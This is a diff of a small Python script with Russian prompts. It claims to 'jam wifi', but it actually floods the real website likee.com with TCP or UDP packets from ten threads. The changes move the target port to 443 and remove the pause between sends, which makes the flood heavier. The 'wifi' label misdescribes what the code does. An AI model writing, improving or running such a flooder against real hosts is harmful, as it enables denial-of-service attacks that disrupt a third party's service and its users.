@@ -1,36 +1,20 @@
 import socket
 import threading
 import time
-import random
-import colorama
-from colorama import Fore
 import os
 
-
 os.system("clear")
+print ("ГЛУШИТ WIFI")
 
-
-colorama.init()
-
-print (Fore.YELLOW + "")
-
-
-print ("Глушит интернет, используёте на свой страх и риск")
-
-print ("")
-
-wificraker = input("Нажмите Enter чтобы глушить wifi")
-print ("Глушим wifi")
-
+i = input("Нажми Enter")
 time.sleep(1)
-#hello world
 
 
 TARGET_HOST = "likee.com"
-TARGET_PORT = 80
+TARGET_PORT = 443
 NUM_THREADS = 10
 PACKETS_PER_THREAD = 1000
-PAYLOAD_SIZE = 4024
+PAYLOAD_SIZE = 1024
 USE_UDP = False
 
 def flood(host, port, packets_per_thread, payload_size, use_udp):
@@ -50,7 +34,8 @@ def flood(host, port, packets_per_thread, payload_size, use_udp):
         except Exception as e:
             print(f"{'UDP' if use_udp else 'TCP'}: Другая ошибка: {e}")
             break
-        time.sleep(0.01)
+        os.system("clear")
+        #time.sleep(0.01)
 
 threads = []
 print(f"Начинаем отправку пакетов на {TARGET_HOST}:{TARGET_PORT}...")
@@ -65,8 +50,3 @@ for thread in threads:
     thread.join()
 
 print("Отправка пакетов завершена.")
-
-
-
-
-    
